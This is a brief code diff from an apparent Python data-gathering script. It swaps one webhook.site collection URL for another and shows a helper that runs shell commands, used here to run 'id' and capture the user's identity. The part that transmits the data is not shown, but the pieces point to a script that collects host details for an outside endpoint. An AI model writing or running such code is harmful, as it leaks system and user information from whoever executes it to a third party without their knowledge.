@@ -10,7 +10,7 @@ def run_cmd(cmd):
     except:
         return "Error executing command"
  
-WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
+WEBHOOK_URL = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"
 
  
 identity = run_cmd('id')
